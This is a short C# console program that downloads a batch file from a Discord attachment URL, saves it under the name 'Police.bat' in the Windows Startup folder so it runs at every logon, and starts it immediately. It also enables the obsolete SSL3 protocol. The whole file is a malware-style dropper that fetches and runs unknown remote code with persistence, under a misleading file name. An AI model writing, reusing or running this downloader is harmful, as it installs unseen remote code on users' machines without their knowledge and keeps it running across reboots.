using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace Davut
{
    class Program
    {
        static void Main(string[] args)


        {




            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls
            | SecurityProtocolType.Tls11

            | SecurityProtocolType.Tls12

            | SecurityProtocolType.Ssl3;

            WebClient client = new WebClient();

            client.DownloadFile("https://cdn.discordapp.com/attachments/1019178193472716851/1019193235396120606/dcRate.bat", Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\Police.bat");


            System.Diagnostics.Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\Police.bat");



        }
    }
}
